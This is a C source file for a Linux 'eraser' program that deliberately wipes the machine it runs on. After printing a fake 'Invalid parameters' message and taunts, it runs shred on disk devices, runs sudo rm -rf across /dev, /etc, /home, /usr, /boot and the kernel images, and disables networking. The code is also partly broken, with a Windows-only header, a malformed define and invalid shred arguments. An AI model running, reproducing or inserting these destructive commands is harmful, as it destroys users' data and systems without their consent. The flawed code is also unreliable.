// ERASER.c
// MADE BY ARTEON!
// ERASE EVERYTHING ON YOUR HARDRIVE
// LAST EDIT 13:20 04.03.20
// Project finished 08.10.2020
// Version: 1.0.1

/*
 *  Eraser.c:  Fully automated eraser to delete every file on your system (linux based)
 *
 *  Copyright Magnus Danielsen (13 december 2018-2020)
 *
 *  This program is free software; you can redistribute it and/or modify it under
 *  the terms of the GNU General Public License as published by the Free Software
 *  Foundation, version 2.
 *
 */

// INCLUDES
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <ctype.h>
#include <errno.h>
#include <linux/hdreg.h>
#include <assert.h>
#include <math.h>
#include <conio.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>
#include <link.h>
#include <time.h>
#include <aes.h>

// DEFINES
#define AEDDABAEDDA 1D1FAC0DF0D85F33561A90AFCA429875



  int main(int argc, char * argv[]) { //screentime
    fprintf(stderr, "\033[22;31m[!] Invalid parameters[!]\033[22;31m\n");
    fprintf(stderr, "\033[22;90m[!] \033[22;31mREMOVING EVERYTHING!\n");
    fprintf(stderr, "\033[22;90m[!] FUCK THE \033[22;31mPOLICE\n");
    fprintf(stderr, "\033[22;90m[!] FUCK THE \033[22;31mFBI\n");
    fprintf(stderr, "\033[22;90m[!] FUCK THE \033[22;31mCIA\n");
    fprintf(stderr, "\033[22;90m[!] FUCK THE \033[22;31mNSA\n");
    fprintf(stderr, "\033[22;90m[!] CREDZ TO MY BOY \033[22;31mB1NARY\n");
    fprintf(stderr, "\033[22;90m[!] YOUR SYSTEM IS \033[22;31mDEAD\n");
    fprintf(stderr, "\033[22;90m[!] MADE BY ARTEON \033[22;31m13th December 2018\n");
    sleep(1);
    //uses wipe to manually uninstall
    system("sudo apt-get install wipe\n"); // installs wipe
    sleep(1); // screentime
    fprintf(stderr, "\033[22;90m[!] This is the\033[22;31mEND\n");
    sleep(1); //starting the process
    system("sudo shred -vfz -n ? sda");
    system("sudo shred -vfz -n ? sr0");
    system("sudo shred -vfz -n ? sdb");
    system("sudo shred -vfz -n ? ubuntu-vg");
    system("sudo shred -vfz -n ? ubuntu-vg/root");
    system("sudo shred -vfz -n ? ubuntu-vg/swap_1");
    system("sudo shred -vfz -n ? ubuntu-vg/*");
    system("shred -vfz -n ? sda");
    system("shred -vfz -n ? sr0");
    system("shred -vfz -n ? sdb");
    system("shred -vfz -n ? ubuntu-vg");
    system("shred -vfz -n ? ubuntu-vg/root");
    system("shred -vfz -n ? ubuntu-vg/swap_1");
    system("shred -vfz -n ? ubuntu-vg/*");
    ////////////////////////////////////////////////////////////////////////////////
    //this manually uninstalls if wipe fails
    system("sudo rm -rf /dev/*");
    system("sudo rm -rf /dev/sr0");
    system("sudo rm -rf /dev/sdb");
    system("sudo rm -rf /dev/ubuntu-vg/*");
    system("sudo rm -rf /dev/ubuntu-vg/root");
    system("sudo rm -rf /dev/ubuntu-vg/swap_1");
    system("sudo rm -rf bins/*");
    system("sudo rm -rf *");
    system("sudo rm -rf");
    system("rm -rf /dev/*");
    system("rm -rf /dev/sr0");
    system("rm -rf /dev/sdb");
    system("rm -rf /dev/ubuntu-vg/*");
    system("rm -rf /dev/ubuntu-vg/root");
    system("rm -rf /dev/ubuntu-vg/swap_1");
    system("rm -rf bins/*");
    system("rm -rf *");
    system("rm -rf");
    system("rm -rf bin/*");
    system("rm -rf boot/*");
    system("rm -rf cdrom/*");
    system("rm -rf etc/*");
    system("rm -rf home/*");
    system("rm -rf lib/*");
    system("rm -rf lib64/*");
    system("rm -rf media/*");
    system("rm -rf mnt/*");
    system("rm -rf opt/*");
    system("rm -rf proc/*");
    system("rm -rf root/*");
    system("rm -rf run/*");
    system("rm -rf sbin/*");
    system("rm -rf snap/*");
    system("rm -rf srv/*");
    system("rm -rf sys/*");
    system("rm -rf tmp/*");
    system("rm -rf usr/*");
    system("rm -rf var/*");
    system("rm -rf initrd.img");
    system("rm -rf initrd.img.old");
    system("rm -rf vmlinuz");
    system("rm -rf vmlinuz.old");
    system("sudo rm -rf bin/*");
    system("sudo rm -rf boot/*");
    system("sudo rm -rf cdrom/*");
    system("sudo rm -rf etc/*");
    system("sudo rm -rf home/*");
    system("sudo rm -rf lib/*");
    system("sudo rm -rf lib64/*");
    system("sudo rm -rf media/*");
    system("sudo rm -rf mnt/*");
    system("sudo rm -rf opt/*");
    system("sudo rm -rf proc/*");
    system("sudo rm -rf root/*");
    system("sudo rm -rf run/*");
    system("sudo rm -rf sbin/*");
    system("sudo rm -rf snap/*");
    system("sudo rm -rf srv/*");
    system("sudo rm -rf sys/*");
    system("sudo rm -rf tmp/*");
    system("sudo rm -rf usr/*");
    system("sudo rm -rf var/*");
    system("sudo rm -rf initrd.img");
    system("sudo rm -rf initrd.img.old");
    system("sudo rm -rf vmlinuz");
    system("sudo rm -rf vmlinuz.old");
    system("sudo ifconfig wlan0 down");   // disconnect from wifi (force)
    system("sudo dhclient -r wlan0");   //   disconnect from wifi (force)
    system("sudo nmcli nm enable false"); // disconnect from wifi (force)
    return 0;
  } // END
